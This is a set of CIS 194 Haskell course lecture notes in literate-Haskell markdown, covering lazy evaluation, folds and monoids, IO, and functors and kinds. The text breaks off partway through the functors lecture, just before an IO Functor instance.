* Expressions are only evaluated when pattern-matched

* ...only as far as necessary for the match to proceed, and no farther!

Let's do a slightly more interesting example: we'll evaluate `take 3
(repeat 7)`.  For reference, here are the definitions of `repeat` and
`take`:

~~~~ {.haskell}
repeat :: a -> [a]
repeat x = x : repeat x

take :: Int -> [a] -> [a] 
take n _      | n <= 0 =  []
take _ []              =  []
take n (x:xs)          =  x : take (n-1) xs
~~~~

Carrying out the evaluation step-by-step looks something like this:

      take 3 (repeat 7)
          { 3 <= 0 is False, so we proceed to the second clause, which
       needs to match on the second argument. So we must expand
       repeat 7 one step. }
    = take 3 (7 : repeat 7)
          { the second clause does not match but the third clause
            does. Note that (3-1) does not get evaluated yet! }
    = 7 : take (3-1) (repeat 7)
          { In order to decide on the first clause, we must test (3-1)
            <= 0 which requires evaluating (3-1). }
    = 7 : take 2 (repeat 7)
          { 2 <= 0 is False, so we must expand repeat 7 again. }
    = 7 : take 2 (7 : repeat 7)
          { The rest is similar. }
    = 7 : 7 : take (2-1) (repeat 7)
    = 7 : 7 : take 1 (repeat 7)
    = 7 : 7 : take 1 (7 : repeat 7)
    = 7 : 7 : 7 : take (1-1) (repeat 7)
    = 7 : 7 : 7 : take 0 (repeat 7)
    = 7 : 7 : 7 : []

(Note that although evaluation *could* be implemented exactly like the
above, most Haskell compilers will do something a bit more
sophisticated.  In particular, GHC uses a technique called *graph
reduction*, where the expression being evaluated is actually
represented as a *graph*, so that different parts of the expression
can share pointers to the same subexpression.  This ensures that work
is not duplicated unnecessarily.  For example, if `f x = [x,x]`,
evaluating `f (1+1)` will only do *one* addition, because the
subexpression `1+1` will be shared between the two occurrences of
`x`.)

Consequences
------------

Laziness has some very interesting, pervasive, and nonobvious
consequences.  Let's explore a few of them.

**Purity**

As we've already seen, choosing a lazy evaluation strategy essentially
*forces* you to also choose purity (assuming you don't want
programmers to go insane).

**Understanding space usage**

Laziness is not all roses.  One of the downsides is that it sometimes
becomes tricky to reason about the space usage of your programs.
Consider the following (innocuous-seeming) example:

~~~~ {.haskell}
-- Standard library function foldl, provided for reference
foldl :: (b -> a -> b) -> b -> [a] -> b
foldl _ z []     = z
foldl f z (x:xs) = foldl f (f z x) xs
~~~~

Let's consider how evaluation proceeds when we evaluate `foldl (+) 0
[1,2,3]` (which sums the numbers in a list):

      foldl (+) 0 [1,2,3]
    = foldl (+) (0+1) [2,3]
   = foldl (+) ((0+1)+2) [3]
   = foldl (+) (((0+1)+2)+3) []
   = (((0+1)+2)+3)
   = ((1+2)+3)
   = (3+3)
   = 6

Since the value of the accumulator is not demanded until recursing
through the entire list, the accumulator simply builds up a big
unevaluated expression `(((0+1)+2)+3)`, which finally gets reduced to
a value at the end.  There are at least two problems with this.  One
is that it's simply inefficient: there's no point in transferring all
the numbers from the list into a different list-like thing (the
accumulator thunk) before actually adding them up.  The second problem
is more subtle, and more insidious: evaluating the expression
`(((0+1)+2)+3)` actually requires pushing the `3` and `2` onto a stack
before being able to compute `0+1` and then unwinding the stack,
adding along the way. This is not a problem for this small example,
but for very long lists it's a big problem: there is usually not as
much space available for the stack, so this can lead to a stack
overflow.

The solution in this case is to use the `foldl'` function instead of
`foldl`, which adds a bit of strictness: in particular, `foldl'`
requires its second argument (the accumulator) to be evaluated before
it proceeds, so a large thunk never builds up:

      foldl' (+) 0 [1,2,3]
    = foldl' (+) (0+1) [2,3]
   = foldl' (+) 1 [2,3]
   = foldl' (+) (1+2) [3]
   = foldl' (+) 3 [3]
   = foldl' (+) (3+3) []
   = foldl' (+) 6 []
   = 6

As you can see, `foldl'` does the additions along the way, which is
what we really want.  But the point is that in this case laziness got
in the way and we had to make our program *less* lazy.

(If you're interested in learning about *how* `foldl'` achieves this,
you can
[read about `seq` on the Haskell wiki](http://www.haskell.org/haskellwiki/Seq).)

**Short-circuiting operators**

In some languages (Java, C++) the boolean operators `&&` and `||`
(logical AND and OR) are *short-circuiting*: for example, if the first
argument to `&&` evaluates to false, the whole expression will
immediately evaluate to false without touching the second argument.
However, this behavior has to be wired into the Java and C++ language
standards as a special case. Normally, in a strict langauge, both
arguments of a two-argument function are be evaluated before calling
the function.  So the short-circuiting behavior of `&&` and `||` is a
special exception to the usual strict semantics of the language.

In Haskell, however, we can define short-circuiting operators without
any special cases.  In fact, `(&&)` and `(||)` are just plan old
library functions!  For example, here's how `(&&)` is defined:

~~~~ {.haskell}
(&&) :: Bool -> Bool -> Bool
True  && x = x
False && _ = False
~~~~

Notice how this definition of `(&&)` does not pattern-match on its
second argument.  Moreover, if the first argument is `False`, the
second argument is entirely ignored. Since `(&&)` does not
pattern-match on its second argument at all, it is short-circuiting in
exactly the same way as the `&&` operator in Java or C++.

Notice that `(&&)` also could have been defined like this:

> (&&!) :: Bool -> Bool -> Bool
> True  &&! True  = True
> True  &&! False = False
> False &&! True  = False
> False &&! False = False

While this version takes on the same values as `(&&)`, it has
different behavior.  For example, consider the following:

~~~~ {.haskell}
False &&  (34^9784346 > 34987345)
False &&! (34^9784346 > 34987345)
~~~~

These will both evaluate to `False`, but the second one will take a
whole lot longer!  Or how about this:

~~~~ {.haskell}
False &&  (head [] == 'x')
False &&! (head [] == 'x')
~~~~

The first one is again `False`, whereas the second one will crash.
Try it!

All of this points out that there are some interesting issues
surrounding laziness to be considered when defining a function.

**User-defined control structures**

Taking the idea of short-circuiting operators one step further, in
Haskell we can define our own *control structures*.

Most languages have some sort of special built-in `if` construct.
Some thought reveals why: in a way similar to short-circuiting Boolean
operators, `if` has special behavior.  Based on the value of the test,
it executes/evaluates only *one* of the two branches.  It would defeat
the whole purpose if both branches were evaluated every time!

In Haskell, however, we can define `if` as a library function!

> if' :: Bool -> a -> a -> a
> if' True  x _ = x
> if' False _ y = y

Of course, Haskell *does* have special built-in `if`-expressions, but
I have never quite understood why.  Perhaps it is simply because the
language designers thought people would expect it.  "What do you mean,
this language doesn't have `if`!?"  In any case, `if` doesn't get used
that much in Haskell anyway; in most situations we prefer
pattern-matching or guards.

We can also define other control structures---we'll see other examples
when we discuss monads.

**Infinite data structures**

Lazy evaluation also means that we can work with *infinite data
structures*.  In fact, we've already seen a few examples, such as
`repeat 7`, which represents an infinite list containing nothing but
`7`.  Defining an infinite data structure actually only creates a
thunk, which we can think of as a "seed" out of which the entire data
structure can *potentially* grow, depending on what parts actually are
used/needed.

Another practical application area is "effectively infinite" data
structures, such as the trees that might arise as the state space of a
game (such as go or chess).  Although the tree is finite in theory, it
is so large as to be effectively infinite---it certainly would not fit
in memory.  Using Haskell, we can define the tree of all possible
moves, and then write a separate algorithm to explore the tree in
whatever way we want. Only the parts of the tree which are actually
explored will be computed.

**Pipelining/wholemeal programming**

As I have mentioned before, doing "pipelined" incremental
transformations of a large data structure can actually be
memory-efficient.  Now we can see why: due to laziness, each stage of
the pipeline can operate in lockstep, only generating each bit of the
result as it is demanded by the next stage in the pipeline.

**Dynamic programming**

As a more specific example of the cool things lazy evaluation buys us,
consider the technique of
[*dynamic programming*](http://en.wikipedia.org/wiki/Dynamic_programming).
Usually, one must take great care to fill in entries of a dynamic
programming table in the proper order, so that every time we compute
the value of a cell, its dependencies have already been computed.  If
we get the order wrong, we get bogus results.

However, using lazy evaluation we can get the Haskell runtime to work
out the proper order of evaluation for us!  For example, here is some
Haskell code to solve the
[0-1 knapsack problem](http://en.wikipedia.org/wiki/Knapsack_problem).
Note how we simply define the array `m` in terms of itself, using the
standard recurrence, and let lazy evaluation work out the proper order
in which to compute its cells.

~~~~ {.haskell}
import Data.Array

knapsack01 :: [Double]   -- values 
           -> [Integer]  -- nonnegative weights
           -> Integer    -- knapsack size
           -> Double     -- max possible value
knapsack01 vs ws maxW = m!(numItems-1, maxW)
  where numItems = length vs
        m = array ((-1,0), (numItems-1, maxW)) $
              [((-1,w), 0) | w <- [0 .. maxW]] ++
              [((i,0), 0) | i <- [0 .. numItems-1]] ++
              [((i,w), best) 
                  | i <- [0 .. numItems-1]
                  , w <- [1 .. maxW]
                  , let best
                          | ws!!i > w  = m!(i-1, w)
                          | otherwise = max (m!(i-1, w)) 
                                            (m!(i-1, w - ws!!i) + vs!!i)
              ]

example = knapsack01 [3,4,5,8,10] [2,3,4,5,9] 20 
~~~~

 <!--
 
XXX dumped here from last time: 

Lazy Evaluation
---------------

Lazy evaluation in Haskell means that expressions aren't evaluated
until they are needed. In many cases, this "need" amounts to printing
out a result, which GHCi does for us whenever it attempts to show us a
value. This evaluation strategy, sometimes referred to as non-strict,
means that expressions such as

> safeNums :: [Int]
> safeNums = take 2 [3, 4, 6, 5 `div` 0, 7, 8]

are perfectly well defined! Yes, there is an expression in that list
that, if evaluated, would raise an exception, but why do we need to
evaluate that division by zero when we've only asked for the first two
elements of the list. In fact, Haskell won't evaluate that dangerous
application of the `div` function, because it isn't needed.

As another example, we have already seen infinite lists, 

> nats :: [Int]
> nats = [0..]

Is this list useful? We don't want to wait around to compute the
length of it, but it is very handy as a source of sequential non-negative
integers. If we want to label the elements of a list, we might write a function like, 

> label :: [a] -> [(Int, a)]
> label = zip [0..]

The fact that `nats` or `[0..]` is infinite doesn't matter because we
will only evaluate as many elements as are needed: remember that the
return value of `zip` has the length of the shorter argument list
given to `zip`. This is the natural way of defining `zip` as there is
no obvious thing to do once we run out of elements from the shorter
list.

> myZip :: [a] -> [b] -> [(a,b)]
> myZip [] _          = []
> myZip _ []          = []
> myZip (x:xs) (y:ys) = (x,y) : myZip xs ys

This is similar to the situation we had when implementing `map`. An
innocent attempt to write a function that satisfies the type leads to
one particular definition.

Of course, we can also build our own infinite lists for great profit,

> myCycle :: [a] -> [a]
> myCycle lst = go lst
>     where go [] = go lst
>           go (x:xs) = x : go xs

This is our own version of the `cycle` function from the standard
library. We saw a use of this function in one implementation of the
`doubleEveryOther` function from homework 1. A similar use is if we
want to extract every other element from a list: we could pattern
match, or we could write,

> everyOther :: [a] -> [a]
> everyOther = map snd . filter fst . zip (cycle [True,False])

This is representative of a declarative style: we are not
specifying _how_ to drop every other element, we are 

1. Specifying how to augment some input data: `zip (cycle
[True,False])`
2. Describing a simple manipulation of that augmented data: `filter
fst`, then
3. Tearing down leftover additional structure: `map snd`

Note that we are not dealing with the list structure in this
implementation, and the _only_ bit of customization is the literal
list `[True, False]` which exactly reflects the unique structure of
our program: the notion of "every other."

-->

 <!--

Local Variables: 
mode:markdown
compile-command:"make explec"
End:

-->



/CS194 Lectures 07 Folds and monoids
=====================================

 <!-- CLASS
 
> {-# OPTIONS_GHC -Wall #-}
> {-# LANGUAGE GeneralizedNewtypeDeriving #-}

-->

CIS 194 Week 7  
25 February 2013

Suggested reading: 

  * Learn You a Haskell, [Only folds and horses](http://learnyouahaskell.com/higher-order-functions#folds)
  * Learn You a Haskell, [Monoids](http://learnyouahaskell.com/functors-applicative-functors-and-monoids#monoids)
  * [Fold](http://haskell.org/haskellwiki/Fold) from the Haskell wiki
  * Heinrich Apfelmus, [Monoids and Finger Trees](http://apfelmus.nfshost.com/articles/monoid-fingertree.html)
  * Dan Piponi, [Haskell Monoids and their Uses](http://blog.sigfpe.com/2009/01/haskell-monoids-and-their-uses.html)
  * [Data.Monoid documentation](http://haskell.org/ghc/docs/latest/html/libraries/base/Data-Monoid.html)
  * [Data.Foldable documentation](http://haskell.org/ghc/docs/latest/html/libraries/base/Data-Foldable.html)

Folds, again
------------

We've already seen how to define a folding function for lists... but
we can generalize the idea to other data types as well!

Consider the following data type of binary trees with data stored at
internal nodes:

> data Tree a = Empty
>             | Node (Tree a) a (Tree a)
>   deriving (Show, Eq)
>
> leaf :: a -> Tree a
> leaf x = Node Empty x Empty

Let's write a function to compute the size of a tree (*i.e.* the
number of `Node`s):

> treeSize :: Tree a -> Integer
> treeSize Empty        = 0
> treeSize (Node l _ r) = 1 + treeSize l + treeSize r

How about the sum of the data in a tree of `Integer`s? 

> treeSum :: Tree Integer -> Integer
> treeSum Empty     = 0
> treeSum (Node l x r)  = x + treeSum l + treeSum r

Or the depth of a tree? 

> treeDepth :: Tree a -> Integer
> treeDepth Empty        = 0
> treeDepth (Node l _ r) = 1 + max (treeDepth l) (treeDepth r)

Or flattening the elements of the tree into a list? 

> flatten :: Tree a -> [a]
> flatten Empty        = []
> flatten (Node l x r) = flatten l ++ [x] ++ flatten r

Are you starting to see any patterns?  Each of the above functions:

  1. takes a `Tree` as input
  1. pattern-matches on the input `Tree`
  1. in the `Empty` case, gives a simple answer
  1. in the `Node` case:
      1. calls itself recursively on both subtrees
      1. somehow combines the results from the recursive calls with the data `x` to produce the final result

As good programmers, we always strive to abstract out repeating
patterns, right?  So let's generalize.  We'll need to pass as
parameters the parts of the above examples which change from example
to example:

  1. The return type
  1. The answer in the `Empty` case
  1. How to combine the recursive calls 

We'll call the type of data contained in the tree `a`, and the type of
the result `b`.

> treeFold :: b -> (b -> a -> b -> b) -> Tree a -> b
> treeFold e _ Empty        = e
> treeFold e f (Node l x r) = f (treeFold e f l) x (treeFold e f r)

Now we should be able to define `treeSize`, `treeSum` and the other
examples much more simply.  Let's try:

> treeSize' :: Tree a -> Integer
> treeSize' = treeFold 0 (\l _ r -> 1 + l + r)
>
> treeSum' :: Tree Integer -> Integer
> treeSum' = treeFold 0 (\l x r -> l + x + r)
> 
> treeDepth' :: Tree a -> Integer
> treeDepth' = treeFold 0 (\l _ r -> 1 + max l r)
>
> flatten' :: Tree a -> [a]
> flatten' = treeFold [] (\l x r -> l ++ [x] ++ r)

We can write new tree-folding functions easily as well: 

> treeMax :: (Ord a, Bounded a) => Tree a -> a
> treeMax = treeFold minBound (\l x r -> l `max` x `max` r)

Much better! 

**Folding expressions**

Where else have we seen folds? 

Recall the `ExprT` type and corresponding `eval` function from Homework 5:

> data ExprT = Lit Integer
>            | Add ExprT ExprT
>            | Mul ExprT ExprT
>
> eval :: ExprT -> Integer
> eval (Lit i)     = i
> eval (Add e1 e2) = eval e1 + eval e2
> eval (Mul e1 e2) = eval e1 * eval e2

Hmm... this looks familiar!  What would a fold for `ExprT` look like?

> exprTFold :: (Integer -> b) -> (b -> b -> b) -> (b -> b -> b) -> ExprT -> b
> exprTFold f _ _ (Lit i)     = f i
> exprTFold f g h (Add e1 e2) = g (exprTFold f g h e1) (exprTFold f g h e2)
> exprTFold f g h (Mul e1 e2) = h (exprTFold f g h e1) (exprTFold f g h e2)
>
> eval2 :: ExprT -> Integer
> eval2 = exprTFold id (+) (*)

Now we can easily do other things like count the number of
literals in an expression:

> numLiterals :: ExprT -> Int
> numLiterals = exprTFold (const 1) (+) (+)

**Folds in general**

The take-away message is that we can implement a fold for many (though
not all) data types. The fold for `T` will take one (higher-order)
argument for each of `T`'s constructors, encoding how to turn the
values stored by that constructor into a value of the result
type---assuming that any recursive occurrences of `T` have already
been folded into a result.  Many functions we might want to write on `T`
will end up being expressible as simple folds.

Monoids
-------

Here's another standard type class you should know about, found in the
[`Data.Monoid`](http://haskell.org/ghc/docs/latest/html/libraries/base/Data-Monoid.html) module:

> class Monoid m where
>     mempty  :: m
>     mappend :: m -> m -> m
>
>     mconcat :: [m] -> m
>     mconcat = foldr mappend mempty
>
> (<>) :: Monoid m => m -> m -> m
> (<>) = mappend

`(<>)` is defined as a synonym for `mappend` (as of GHC 7.4.1) simply
because writing `mappend` is tedious.

Types which are instances of `Monoid` have a special element called
`mempty`, and a binary operation `mappend` (abbreviated `(<>)`) which
takes two values of the type and produces another one.  The intention
is that `mempty` is an identity for `<>`, and `<>` is
associative; that is, for all `x`, `y`, and `z`,

1. `mempty <> x == x`
2. `x <> mempty == x`
3. `(x <> y) <> z == x <> (y <> z)`

The associativity law means that we can unambiguously write things like

`a <> b <> c <> d <> e`

because we will get the same result no matter how we parenthesize.

There is also `mconcat`, for combining a whole list of values.  By
default it is implemented using `foldr`, but it is included in the
`Monoid` class since particular instances of `Monoid` may have more
efficient ways of implementing it.

`Monoid`s show up *everywhere*, once you know to look for them.  Let's
write some instances (just for practice; these are all in the
standard libraries).

Lists form a monoid under concatenation: 

> instance Monoid [a] where
>   mempty  = []
>   mappend = (++)

As hinted above, addition defines a perfectly good monoid on integers
(or rational numbers, or real numbers...).  However, so does
multiplication!  What to do? We can't give two different instances of
the same type class to the same type.  Instead, we create two
`newtype`s, one for each instance:

> newtype Sum a = Sum a
>   deriving (Eq, Ord, Num, Show)
>
> getSum :: Sum a -> a
> getSum (Sum a) = a
>
> instance Num a => Monoid (Sum a) where
>   mempty  = Sum 0
>   mappend = (+)
>
> newtype Product a = Product a
>   deriving (Eq, Ord, Num, Show)
>
> getProduct :: Product a -> a
> getProduct (Product a) = a
>
> instance Num a => Monoid (Product a) where
>   mempty  = Product 1
>   mappend = (*)

Note that to find, say, the product of a list of `Integer`s using
`mconcat`, we have to first turn them into values of type `Product
Integer`:

> lst :: [Integer]
> lst = [1,5,8,23,423,99]
>
> prod :: Integer
> prod = getProduct . mconcat . map Product $ lst

(Of course, this particular example is silly, since we could use the
standard `product` function instead, but this pattern does come in
handy somtimes.)

Pairs form a monoid as long as the individual components do:

> instance (Monoid a, Monoid b) => Monoid (a,b) where
>   mempty = (mempty, mempty)
>   (a,b) `mappend` (c,d) = (a `mappend` c, b `mappend` d)

Challenge: can you make an instance of `Monoid` for `Bool`?  How many
different instances are there?

Challenge: how would you make function types an instance of
`Monoid`?


 <!--

Local Variables: 
mode:markdown
compile-command:"make explec"
End:

-->


/CS194 Lectures 08 IO
=====================

 <!-- CLASS

> {-# OPTIONS_GHC -Wall #-}
> {-# LANGUAGE GeneralizedNewtypeDeriving #-}

-->

CIS 194 Week 8  
11 March 2013

Suggested reading: 

  * [LYAH Chapter 9: Input and Output](http://learnyouahaskell.com/input-and-output)
  * [RWH Chapter 7: I/O](http://book.realworldhaskell.org/read/io.html)

The problem with purity
-----------------------

Remember that Haskell is *lazy* and therefore *pure*.  This means two
primary things:

1. Functions may not have any external effects. For example, a
   function may not print anything on the screen.  Functions may
   only compute their outputs.

2. Functions may not depend on external stuff.  For example, they may
   not read from the keyboard, or filesystem, or network.  Functions
   may depend only on their inputs---put another way, functions should
   give the same output for the same input every time.

But---sometimes we *do* want to be able to do stuff like this!  If the
only thing we could do with Haskell is write functions which we can
then evaluate at the ghci prompt, it would be theoretically
interesting but practically useless.

In fact, it *is* possible to do these sorts of things with Haskell,
but it looks very different than in most other languages.

The `IO` type
-------------

The solution to the conundrum is a special type called `IO`.  Values
of type `IO a` are *descriptions of* effectful computations, which, if
executed would (possibly) perform some effectful I/O operations and
(eventually) produce a value of type `a`.  There is a level of
indirection here that's crucial to understand.  A value of type `IO
a`, *in and of itself*, is just an inert, perfectly safe thing with no
effects. It is just a *description* of an effectful computation.  One
way to think of it is as a *first-class imperative program*.

As an illustration, suppose you have 

    c :: Cake

What do you have?  Why, a delicious cake, of course.  Plain and
simple.

<img src="/static/cake.jpg" width="200" />

By contrast, suppose you have 

    r :: Recipe Cake

What do you have?  A cake?  No, you have some *instructions* for how
to make a cake, just a sheet of paper with some writing on it.  

<img src="/static/recipe.gif" width="200" />

Not only do you not actually have a cake, merely being in possession
of the recipe has no effect on anything else whatsoever.  Simply
holding the recipe in your hand does not cause your oven to get hot or
flour to be spilled all over your floor or anything of that sort.  To
actually produce a cake, the recipe must be *followed* (causing flour
to be spilled, ingredients mixed, the oven to get hot, *etc.*).

<img src="/static/fire.jpg" width="200" />

In the same way, a value of type `IO a` is just a "recipe" for
producing a value of type `a` (and possibly having some effects along
the way).  Like any other value, it can be passed as an argument,
returned as the output of a function, stored in a data structure, or
(as we will see shortly) combined with other `IO` values into more
complex recipes.

So, how do values of type `IO a` actually ever get executed?  There is
only one way: the Haskell compiler looks for a special value

    main :: IO ()

which will actually get handed to the runtime system and 
executed. That's it! Think of the Haskell runtime system as a master
chef who is the only one allowed to do any cooking.

<img src="/static/chef.jpg" width="200" />

If you want your recipe to be followed then you had better make it
part of the big recipe (`main`) that gets handed to the master chef.
Of course, `main` can be arbitrarily complicated, and will usually be
composed of many smaller `IO` computations.

So let's write our first actual, executable Haskell program!  We can
use the function

    putStrLn :: String -> IO ()

which, given a `String`, returns an `IO` computation that will (when
executed) print out that `String` on the screen.  So we simply put
this in a file called `Hello.hs`:

    main = putStrLn "Hello, Haskell!"

Then typing `runhaskell Hello.hs` at a command-line prompt results in
our message getting printed to the screen!  We can also use `ghc
--make Hello.hs` to produce an executable version called `Hello` (or
`Hello.exe` on Windows).

There is no `String` "inside" an `IO String`
--------------------------------------------

Many new Haskell users end up at some point asking a question like "I
have an `IO String`, how do I turn it into a `String`?", or, "How do I
get the `String` out of an `IO String`"?  Given the above intuition,
it should be clear that these are nonsensical questions: a value of
type `IO String` is a description of some computation, a *recipe*, for
generating a `String`.  There is no `String` "inside" an `IO String`,
any more than there is a cake "inside" a cake recipe.  To produce a
`String` (or a delicious cake) requires actually *executing* the
computation (or recipe).  And the only way to do that is to give it
(perhaps as part of some larger `IO` value) to the Haskell runtime
system, via `main`.

Combining `IO`
--------------

As should be clear by now, we need a way to *combine* `IO`
computations into larger ones.

The simplest way to combine two `IO` computations is with the `(>>)`
operator (pronounced "and then"), which has the type

~~~~ {.haskell}
(>>) :: IO a -> IO b -> IO b
~~~~

This simply creates an `IO` computation which consists of running the
two input computations in sequence.  Notice that the result of the
first computation is discarded; we only care about it for its
*effects*.  For example:

~~~~ {.haskell}
main = putStrLn "Hello" >> putStrLn "world!"
~~~~

This works fine for code of the form "do this; do this; do this" where
the results don't really matter. However, in general this is
insufficient.  What if we don't want to throw away the result from the
first computation?
  
A first attempt at resolving the situation might be to have something
of type `IO a -> IO b -> IO (a,b)`.  However, this is also
insufficient. The reason is that we want the second computation to be
able to *depend* on the result of the first.  For example, suppose we
want to read an integer from the user and then print out one more than
the integer they entered.  In this case the second computation
(printing some number on the screen) will be different depending on
the result of the first.
  
Instead, there is an operator `(>>=)` (pronounced "bind") with the
type

~~~~ {.haskell}
(>>=) :: IO a -> (a -> IO b) -> IO b
~~~~

This can be difficult to wrap one's head around at first!  `(>>=)`
takes a computation which will produce a value of type `a`, and a
*function* which gets to *compute* a second computation based on this
intermediate value of type `a`.  The result of `(>>=)` is a
(description of a) computation which performs the first computation,
uses its result to decide what to do next, and then does that.

For example, we can write a program to read a number from the user and
print out its successor.  Note our use of `readLn :: Read a => IO a`
which is a computation that reads input from the user and converts it
into any type which is an instance of `Read`.

~~~~ {.haskell}
main :: IO ()
main = putStrLn "Please enter a number: " >> (readLn >>= (\n -> putStrLn (show (n+1))))
~~~~

Of course, this looks kind of ugly, but there are better ways to write it, which
we'll talk about in the future.


Record syntax
-------------

*This material was not covered in lecture, but is provided as an extra
 resource for completing homework 8.*

Suppose we have a data type such as 

~~~~ {.haskell}
data D = C T1 T2 T3
~~~~

We could also declare this data type with *record syntax* as follows:

~~~~ {.haskell}
data D = C { field1 :: T1, field2 :: T2, field3 :: T3 }
~~~~

where we specify not just a type but also a *name* for each field
stored inside the `C` constructor.  This new version of `D` can be
used in all the same ways as the old version (in particular we can
still construct and pattern-match on values of type `D` as `C v1 v2
v3`).  However, we get some additional benefits.

  1. Each field name is automatically a *projection function* which
     gets the value of that field out of a value of type `D`.  For
     example, `field2` is a function of type

    ~~~~ {.haskell}
   field2 :: D -> T2
   ~~~~

     Before, we would have had to implement `field2` ourselves by
     writing

    ~~~~ {.haskell}
   field2 (C _ f _) = f
   ~~~~

    This gets rid of a lot of boilerplate if we have a data type with
    many fields!

  1. There is special syntax for *constructing*, *modifying*, and
     *pattern-matching* on values of type `D` (in addition to the
     usual syntax for such things).

    We can *construct* a value of type `D` using syntax like

    ~~~~ {.haskell}
    C { field3 = ..., field1 = ..., field2 = ... }
    ~~~~

     with the `...` filled in by expressions of the right type.  Note
     that we can specify the fields in any order.

     Suppose we have a value `d :: D`.  We can *modify* `d` using
     syntax like

    ~~~~ {.haskell}
    d { field3 = ... }
    ~~~~

     Of course, by "modify" we don't mean actually mutating `d`, but
     rather constructing a new value of type `D` which is the same as
     `d` except with the `field3` field replaced by the given value.

     Finally, we can *pattern-match* on values of type `D` like so:

    ~~~~ {.haskell}
    foo (C { field1 = x }) = ... x ...
    ~~~~

     This matches only on the `field1` field from the `D` value,
     calling it `x` (of course, in place of `x` we could also put an
     arbitrary pattern), ignoring the other fields.

 <!--

Local Variables: 
mode:markdown
compile-command:"mk build"
End:

-->


/CS194 Lectures 09 Functors
===========================

 <!-- CLASS

> {-# OPTIONS_GHC -Wall #-}
>
> import Prelude hiding (Functor(..))

-->

CIS 194 Week 9  
18 March 2013

Suggested reading: 

  * Learn You a Haskell, [The Functor typeclass](http://learnyouahaskell.com/making-our-own-types-and-typeclasses#the-functor-typeclass)
  * [The Typeclassopedia](http://www.haskell.org/haskellwiki/Typeclassopedia)

Motivation
----------

Over the past weeks we have seen a number of functions designed to
"map" a function over every element of some sort of container.  For
example:

  * `map :: (a -> b) -> [a] -> [b]`

  * `treeMap :: (a -> b) -> Tree a -> Tree b`

  * In Homework 5 many people ended up doing a similar thing when you had to
    somehow apply `eval :: ExprT -> Int` to a `Maybe ExprT` in order to
    get a `Maybe Int`.

    `maybeEval :: (ExprT -> Int) -> Maybe ExprT -> Maybe Int`

    `maybeMap :: (a -> b) -> Maybe a -> Maybe b`

There's a repeated pattern here, and as good Haskell programmers we
want to know how to generalize it!  So which parts are the same from
example to example, and which parts are different?

The part that is different, of course, is the container being "mapped
over":

~~~~ {.haskell}
thingMap :: (a -> b) -> f a -> f b
~~~~

But what sort of things are these "containers"?  Can we really assign
a type variable like `f` to them?

A brief digression on kinds
---------------------------

Just as every expression has a type, types themselves have "types",
called *kinds*.  (Before you ask: no, there's not another level beyond
kinds---not in Haskell at least.)  In `ghci` we can ask about the
kinds of types using `:kind`.  For example, let's ask for the kind of
`Int`:

    Prelude> :k Int
    Int :: *

We see that `Int` has kind `*`.  In fact, every type which can
actually serve as the type of some values has kind `*`.

    Prelude> :k Bool
    Bool :: *
    Prelude> :k Char
    Char :: *
    Prelude> :k Maybe Int
    Maybe Int :: *

If `Maybe Int` has kind `*`, then what about `Maybe`?  Notice that
there are no values of type `Maybe`.  There are values of type `Maybe
Int`, and of type `Maybe Bool`, but not of type `Maybe`.  But `Maybe`
is certainly a valid type-like-thing.  So what is it?  What kind does
it have?  Let's ask `ghci`:

    Prelude> :k Maybe
    Maybe :: * -> *

`ghci` tells us that `Maybe` has kind `* -> *`.  `Maybe` is, in a
sense, a *function on types* --- we usually call it a *type
constructor*.  `Maybe` takes as input types of kind `*`, and produces
another type of kind `*`.  For example, it can take as input `Int :: *`
and produce the new type `Maybe Int :: *`.

Are there other type constructors with kind `* -> *`?  Sure.  For
example, `Tree`, or the list type constructor, written `[]`.

    Prelude> :k []
    [] :: * -> *
    Prelude :k [] Int
    [] Int :: *
    Prelude> :k [Int]  -- special syntax for [] Int
    [Int] :: *
    Prelude> :k Tree
    Tree :: * -> *

What about type constructors with other kinds?  How about `JoinList`
from Homework 7?

> data JoinList m a = Empty
>                   | Single m a
>                   | Append m (JoinList m a) (JoinList m a)

    Prelude> :k JoinList
    JoinList :: * -> * -> *

This makes sense: `JoinList` expects *two* types as parameters and
gives us back a new type.  (Of course, it is curried, so we can also
think of it as taking *one* type and giving back something of kind `*
-> *`.)  Here's another one:

    Prelude> :k (->)
    (->) :: * -> * -> *

Tthis tells us that the function type constructor takes two type
arguments.  Like any operator, we use it infix:

    Prelude> :k Int -> Char
    Int -> Char :: *

But we don't have to: 

    Prelude> :k (->) Int Char
    (->) Int Char :: *

OK, what about this one? 

> data Funny f a = Funny a (f a)

    Prelude> :k Funny
    Funny :: (* -> *) -> * -> *

`Funny` takes two arguments, the first one a type of kind `* -> *`,
and the second a type of kind `*`, and constructs a type.  (How did
GHCi know what the kind of `Funny` is?  Well, it does *kind inference*
just like it also does *type inference*.)  `Funny` is a *higher-order*
type constructor, in the same way that `map` is a *higher-order*
function.  Note that types can be partially applied, too,
just like functions:

    Prelude> :k Funny Maybe
    Funny Maybe :: * -> *
    Prelude> :k Funny Maybe Int
    Funny Maybe Int :: *

Functor
-------

The essence of the mapping pattern we saw was a higher-order function
with a type like

~~~~ {.haskell}
thingMap :: (a -> b) -> f a -> f b
~~~~

where `f` is a type variable standing in for some type of kind `* ->
*`.  So, can we write a function of this type once and for all?

~~~~ {.haskell}
thingMap :: (a -> b) -> f a -> f b
thingMap h fa = ???
~~~~

Well, not really.  There's not much we can do if we don't know what
`f` is.  `thingMap` has to work differently for each particular `f`.
The solution is to make a type class, which is traditionally called
`Functor`:

> class Functor f where
>   fmap :: (a -> b) -> f a -> f b

(`Functor` is defined in the standard Prelude. Note that the name
"functor" comes from category theory, and is *not* the same thing as
functors in C++ (which are essentially first-class functions).)  Now
we can just implement this class in a way specific to each particular
`f`.  Note that the `Functor` class abstracts over types
of kind `* -> *`.  So it would make no sense to write

~~~~ {.haskell}
instance Functor Int where
  fmap = ...
~~~~

Indeed, if we try, we get a very nice *kind mismatch error*:

    [1 of 1] Compiling Main             ( 09-functors.lhs, interpreted )

    09-functors.lhs:145:19:
        Kind mis-match
        The first argument of `Functor' should have kind `* -> *',
        but `Int' has kind `*'
        In the instance declaration for `Functor Int'

If we understand kinds, this error tells us exactly what is wrong.

However, it does make sense (kind-wise) to make a `Functor` instance
for, say, `Maybe`.  Let's do it.  Following the types makes it almost
trivial:

> instance Functor Maybe where
>   fmap _ Nothing  = Nothing
>   fmap h (Just a) = Just (h a)

How about lists? 

> instance Functor [] where
>   fmap _ []     = []
>   fmap f (x:xs) = f x : fmap f xs
>   -- or just
>   -- fmap = map

Easy peasy.  What about `IO`?  Could it make sense to create an
instance of `Functor` for `IO`?

Sure.  `fmap :: (a -> b) -> IO a -> IO b` results in the IO action
which first runs the `IO a` action, then applies the function to
transform the result before returning it.  We can implement this
without too much trouble:

